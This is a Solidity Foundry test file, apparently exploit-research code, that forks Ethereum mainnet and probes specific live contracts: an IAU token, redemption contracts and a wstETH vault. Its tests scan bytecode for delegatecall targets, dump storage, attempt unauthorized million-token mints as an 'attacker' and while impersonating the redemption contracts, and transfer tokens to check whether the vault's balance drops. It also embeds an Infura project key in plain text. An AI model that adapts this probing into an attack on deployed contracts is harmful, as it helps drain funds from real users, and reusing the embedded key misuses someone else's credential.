// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract IAUDelegatecallExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    // Found in REDEMPTION_0 CALL #8
    address constant MYSTERIOUS_ADDR = 0x58221220D7cDe93ae04c34a2F1e83dfd824afa92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_InvestigateIAUDelegatecalls() public view {
        console.log("=== INVESTIGATING IAU DELEGATECALLS ===\n");

        bytes memory code = IAU.code;

        // Find all 5 DELEGATECALLs
        uint dcNum = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) {
                dcNum++;
                console.log("DELEGATECALL #", dcNum, "at offset:", i);

                // Look backwards for SLOAD or PUSH20
                uint start = i > 100 ? i - 100 : 0;
                bool foundSload = false;
                bool foundPush20 = false;

                for (uint j = start; j < i; j++) {
                    if (uint8(code[j]) == 0x54) { // SLOAD
                        foundSload = true;
                        console.log("  SLOAD at:", j);
                    }
                    if (uint8(code[j]) == 0x73) { // PUSH20
                        foundPush20 = true;
                        bytes memory addrBytes = new bytes(20);
                        for (uint k = 0; k < 20 && j + 1 + k < code.length; k++) {
                            addrBytes[k] = code[j + 1 + k];
                        }
                        address addr = address(bytes20(addrBytes));
                        console.log("  PUSH20:", addr);
                    }
                }

                if (!foundSload && !foundPush20) {
                    console.log("  Target from calldata/memory?");
                }
            }
        }
    }

    function test_AnalyzeIAUDelegatecallAtOffset492() public view {
        console.log("=== ANALYZING IAU DELEGATECALL AT OFFSET 492 ===\n");

        bytes memory code = IAU.code;

        // Look at code around offset 492
        console.log("Bytecode around DELEGATECALL at 492:");

        for (uint i = 450; i < 520 && i < code.length; i++) {
            uint8 op = uint8(code[i]);

            if (op == 0x54) console.log(i, "SLOAD");
            else if (op == 0x55) console.log(i, "SSTORE");
            else if (op == 0x33) console.log(i, "CALLER");
            else if (op == 0x32) console.log(i, "ORIGIN");
            else if (op == 0xf1) console.log(i, "CALL");
            else if (op == 0xf4) console.log(i, "DELEGATECALL");
            else if (op == 0x73) {
                bytes memory addrBytes = new bytes(20);
                for (uint k = 0; k < 20 && i + 1 + k < code.length; k++) {
                    addrBytes[k] = code[i + 1 + k];
                }
                address addr = address(bytes20(addrBytes));
                console.log(i, "PUSH20:", addr);
            }
            else if (op >= 0x60 && op <= 0x7f) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                console.log(i, "PUSH value:", val);
            }
        }
    }

    function test_CheckMysteriousAddress() public view {
        console.log("=== CHECKING MYSTERIOUS ADDRESS ===\n");

        console.log("MYSTERIOUS_ADDR:", MYSTERIOUS_ADDR);
        console.log("Code size:", MYSTERIOUS_ADDR.code.length);

        if (MYSTERIOUS_ADDR.code.length > 0) {
            bytes memory code = MYSTERIOUS_ADDR.code;

            // Find selectors
            console.log("\nFunction selectors:");
            bytes4[] memory uniqueSels = new bytes4[](30);
            uint selCount = 0;

            for (uint i = 0; i + 4 < code.length; i++) {
                if (uint8(code[i]) == 0x63) {
                    bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                    if (sel == 0xffffffff || sel == bytes4(0)) continue;

                    bool isUnique = true;
                    for (uint j = 0; j < selCount; j++) {
                        if (uniqueSels[j] == sel) {
                            isUnique = false;
                            break;
                        }
                    }

                    if (isUnique && selCount < 30) {
                        uniqueSels[selCount] = sel;
                        selCount++;
                    }
                }
            }

            for (uint i = 0; i < selCount; i++) {
                console.logBytes4(uniqueSels[i]);
            }
        }

        // Check storage
        console.log("\nStorage slots:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(MYSTERIOUS_ADDR, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("  Slot", i, ":");
                console.logBytes32(slot);
            }
        }
    }

    function test_TraceIAUTransfer() public {
        console.log("=== TRACING IAU TRANSFER ===\n");

        deal(IAU, attacker, 10000e18);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        // Transfer IAU to REDEMPTION_0
        console.log("Transferring IAU to REDEMPTION_0...");
        (bool s1, bytes memory d1) = IAU.call(
            abi.encodeWithSignature("transfer(address,uint256)", REDEMPTION_0, 100e18)
        );
        console.log("Transfer success:", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        // Transfer IAU to REDEMPTION_1
        console.log("\nTransferring IAU to REDEMPTION_1...");
        (bool s2, bytes memory d2) = IAU.call(
            abi.encodeWithSignature("transfer(address,uint256)", REDEMPTION_1, 100e18)
        );
        console.log("Transfer success:", s2);
        if (!s2 && d2.length >= 4) {
            console.logBytes4(bytes4(d2));
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** TRANSFER TRIGGERED EXPLOIT! ***");
        }
    }

    function test_CheckIAUDelegatecallTarget() public view {
        console.log("=== CHECKING IAU DELEGATECALL TARGET ===\n");

        // IAU storage slot 5 has the timelock
        // But what about the delegatecall target?

        bytes32 slot0 = vm.load(IAU, bytes32(uint256(0)));
        bytes32 slot1 = vm.load(IAU, bytes32(uint256(1)));
        bytes32 slot5 = vm.load(IAU, bytes32(uint256(5)));
        bytes32 slot6 = vm.load(IAU, bytes32(uint256(6)));
        bytes32 slot7 = vm.load(IAU, bytes32(uint256(7)));

        console.log("IAU storage:");
        console.log("Slot 0:");
        console.logBytes32(slot0);
        console.log("Slot 1:");
        console.logBytes32(slot1);
        console.log("Slot 5 (Owner/Timelock):");
        console.logBytes32(slot5);
        console.log("Slot 6:");
        console.logBytes32(slot6);
        console.log("Slot 7:");
        console.logBytes32(slot7);

        // Check if there's a proxy implementation
        // Common proxy patterns:
        // - EIP-1967: keccak256("eip1967.proxy.implementation") - 1
        // - OpenZeppelin upgradeable: slot 0
        // - Custom slots

        // Check mappings at higher slots
        console.log("\nChecking higher slots:");
        for (uint i = 100; i < 110; i++) {
            bytes32 slot = vm.load(IAU, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("  Slot", i, ":", uint256(slot));
            }
        }
    }

    function test_FindIAUImplementation() public view {
        console.log("=== FINDING IAU IMPLEMENTATION ===\n");

        bytes memory code = IAU.code;

        // Find hardcoded addresses in bytecode
        console.log("Scanning for PUSH20 addresses in IAU:");

        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0x73) { // PUSH20
                bytes memory addrBytes = new bytes(20);
                for (uint k = 0; k < 20 && i + 1 + k < code.length; k++) {
                    addrBytes[k] = code[i + 1 + k];
                }
                address addr = address(bytes20(addrBytes));

                // Filter out common addresses like 0xFF..FF
                if (addr != address(0) && addr != address(0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF)) {
                    console.log("Found at offset", i, ":");
                    console.log("  ", addr);
                    console.log("  Code size:", addr.code.length);
                }
            }
        }
    }

    function test_TryMintBurn() public {
        console.log("=== TRYING MINT/BURN ON IAU ===\n");

        // Check if there's a mint/burn that could be called

        vm.startPrank(attacker);

        // Try mint
        (bool s1, bytes memory d1) = IAU.call(
            abi.encodeWithSignature("mint(address,uint256)", attacker, 1000000e18)
        );
        console.log("mint(address,uint256):", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        // Try other mint variants
        (bool s2,) = IAU.call(
            abi.encodeWithSelector(bytes4(0x449a52f8), attacker, 1000000e18)
        );
        console.log("0x449a52f8 (mint?):", s2);

        vm.stopPrank();

        // Try as REDEMPTION_0
        vm.startPrank(REDEMPTION_0);
        (bool s3,) = IAU.call(
            abi.encodeWithSignature("mint(address,uint256)", attacker, 1000000e18)
        );
        console.log("mint as REDEMPTION_0:", s3);
        vm.stopPrank();

        // Try as REDEMPTION_1
        vm.startPrank(REDEMPTION_1);
        (bool s4,) = IAU.call(
            abi.encodeWithSignature("mint(address,uint256)", attacker, 1000000e18)
        );
        console.log("mint as REDEMPTION_1:", s4);
        vm.stopPrank();
    }

    function test_CheckWhitelistPattern() public view {
        console.log("=== CHECKING WHITELIST PATTERN IN IAU ===\n");

        // IAU has selector 0xaa271e1a which might be isMinter/isWhitelisted
        // and 0x6b32810b

        // Try to decode
        (bool s1, bytes memory d1) = IAU.staticcall(
            abi.encodeWithSelector(bytes4(0xaa271e1a), REDEMPTION_0)
        );
        if (s1) {
            console.log("0xaa271e1a(REDEMPTION_0):", abi.decode(d1, (bool)));
        }

        (bool s2, bytes memory d2) = IAU.staticcall(
            abi.encodeWithSelector(bytes4(0xaa271e1a), REDEMPTION_1)
        );
        if (s2) {
            console.log("0xaa271e1a(REDEMPTION_1):", abi.decode(d2, (bool)));
        }

        (bool s3, bytes memory d3) = IAU.staticcall(
            abi.encodeWithSelector(bytes4(0xaa271e1a), VAULT)
        );
        if (s3) {
            console.log("0xaa271e1a(VAULT):", abi.decode(d3, (bool)));
        }

        // Check 0x6b32810b
        (bool s4, bytes memory d4) = IAU.staticcall(
            abi.encodeWithSelector(bytes4(0x6b32810b))
        );
        if (s4 && d4.length >= 32) {
            console.log("0x6b32810b():", uint256(bytes32(d4)));
        }
    }
}
